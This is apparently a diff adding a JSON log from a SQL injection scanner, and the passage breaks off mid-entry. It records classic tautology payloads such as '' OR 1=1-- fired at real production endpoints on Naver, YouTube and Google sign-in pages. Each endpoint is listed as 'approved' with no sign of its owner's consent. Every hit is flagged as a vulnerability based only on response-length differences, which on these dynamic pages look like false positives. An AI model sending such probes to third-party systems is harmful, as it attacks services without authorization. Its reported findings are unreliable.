@@ -1,0 +1,800 @@
+[
+  {
+    "timestamp": "2026-05-08 02:24:15",
+    "target_url": "http://localhost:8000/search?q=test",
+    "approved_domains": [
+      "localhost",
+      "example.com"
+    ],
+    "timeout": 10,
+    "results": []
+  },
+  {
+    "timestamp": "2026-05-09 20:56:26",
+    "target_url": "https://ko.dict.naver.com/#/main",
+    "approved_domains": [
+      "localhost",
+      "example.com",
+      "ko.dict.naver.com"
+    ],
+    "timeout": 10,
+    "results": [
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "mode",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1543,
+          "false_length": 1416,
+          "length_diff": 127
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "mode",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1472,
+          "false_length": 1661,
+          "length_diff": 189
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "size",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 2000,
+          "false_length": 1282,
+          "length_diff": 718
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "size",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1551,
+          "false_length": 1468,
+          "length_diff": 83
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "size",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1557,
+          "false_length": 1874,
+          "length_diff": 317
+        }
+      }
+    ]
+  },
+  {
+    "timestamp": "2026-05-09 20:56:37",
+    "target_url": "https://ko.dict.naver.com/#/main",
+    "approved_domains": [
+      "localhost",
+      "example.com",
+      "ko.dict.naver.com"
+    ],
+    "timeout": 10,
+    "results": [
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "mode",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1600,
+          "false_length": 2261,
+          "length_diff": 661
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "size",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1273,
+          "false_length": 1415,
+          "length_diff": 142
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "size",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1762,
+          "false_length": 1411,
+          "length_diff": 351
+        }
+      },
+      {
+        "target_url": "https://ko.dict.naver.com/api/main/koko/correct/korean/list?mode=pc&size=2",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "size",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1265,
+          "false_length": 1651,
+          "length_diff": 386
+        }
+      }
+    ]
+  },
+  {
+    "timestamp": "2026-05-09 22:22:47",
+    "target_url": "https://www.youtube.com/",
+    "approved_domains": [
+      "localhost",
+      "example.com",
+      "www.youtube.com"
+    ],
+    "timeout": 10,
+    "results": [
+      {
+        "target_url": "https://www.youtube.com/results",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "search_query",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1315256,
+          "false_length": 1534761,
+          "length_diff": 219505
+        }
+      },
+      {
+        "target_url": "https://www.youtube.com/results",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "search_query",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1314911,
+          "false_length": 1519927,
+          "length_diff": 205016
+        }
+      },
+      {
+        "target_url": "https://www.youtube.com/results",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "search_query",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 1299291,
+          "false_length": 1532329,
+          "length_diff": 233038
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898200,
+          "false_length": 898324,
+          "length_diff": 124
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897964,
+          "false_length": 898004,
+          "length_diff": 40
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898060,
+          "false_length": 897931,
+          "length_diff": 129
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898024,
+          "false_length": 897720,
+          "length_diff": 304
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898195,
+          "false_length": 897986,
+          "length_diff": 209
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898258,
+          "false_length": 897879,
+          "length_diff": 379
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898334,
+          "false_length": 898174,
+          "length_diff": 160
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898290,
+          "false_length": 898034,
+          "length_diff": 256
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/ServiceLogin?service=youtube&uilel=3&passive=true&continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898056,
+          "false_length": 898313,
+          "length_diff": 257
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898401,
+          "false_length": 898229,
+          "length_diff": 172
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898193,
+          "false_length": 898710,
+          "length_diff": 517
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898231,
+          "false_length": 899210,
+          "length_diff": 979
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898094,
+          "false_length": 898483,
+          "length_diff": 389
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897900,
+          "false_length": 898167,
+          "length_diff": 267
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898355,
+          "false_length": 899355,
+          "length_diff": 1000
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897954,
+          "false_length": 898043,
+          "length_diff": 89
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897934,
+          "false_length": 897824,
+          "length_diff": 110
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "dsh",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897921,
+          "false_length": 897670,
+          "length_diff": 251
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "dsh",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898291,
+          "false_length": 898069,
+          "length_diff": 222
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/InteractiveLogin?continue=https://www.youtube.com/signin?action_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&hl=ko&passive=true&service=youtube&uilel=3&dsh=S1478988713:1778328905193759",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "dsh",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 899234,
+          "false_length": 897714,
+          "length_diff": 1520
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "dsh",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897793,
+          "false_length": 898281,
+          "length_diff": 488
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "dsh",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898017,
+          "false_length": 898281,
+          "length_diff": 264
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "dsh",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898163,
+          "false_length": 898034,
+          "length_diff": 129
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898185,
+          "false_length": 898135,
+          "length_diff": 50
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898379,
+          "false_length": 898042,
+          "length_diff": 337
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "hl",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 899194,
+          "false_length": 898319,
+          "length_diff": 875
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898166,
+          "false_length": 897974,
+          "length_diff": 192
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 897928,
+          "false_length": 898166,
+          "length_diff": 238
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "passive",
+        "payload": "' OR 1=1--",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898362,
+          "false_length": 898106,
+          "length_diff": 256
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "uilel",
+        "payload": "\" OR \"1\"=\"1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 898228,
+          "false_length": 897956,
+          "length_diff": 272
+        }
+      },
+      {
+        "target_url": "https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.youtube.com%2Fsignin%3Faction_handle_signin%3Dtrue%26app%3Ddesktop%26hl%3Dko%26next%3D%252Fsignin_passive%26feature%3Dpassive&dsh=S1478988713%3A1778328905193759&hl=ko&passive=true&service=youtube&uilel=3&flowName=WebLiteSignIn&flowEntry=ServiceLogin&ifkv=AWa2PascaE5GbBKivMnYhBk3cRmMI9_0XlYAb9rg9GpSHbLosd0dt6LyKMmCCAPHasT5IoLx8JU7Gg",
+        "vulnerability_type": "SQL Injection (Boolean-based)",
+        "parameter": "flowEntry",
+        "payload": "' OR '1'='1",
+        "http_method": "GET",
+        "status_code": 200,
+        "evidence": {
+          "detection_method": "boolean_cross_validation",
+          "true_status_code": 200,
+          "false_status_code": 200,
+          "true_length": 870258,
+          "false_length": 869968,
+          "length_diff": 290
+        }
+      },
+      {
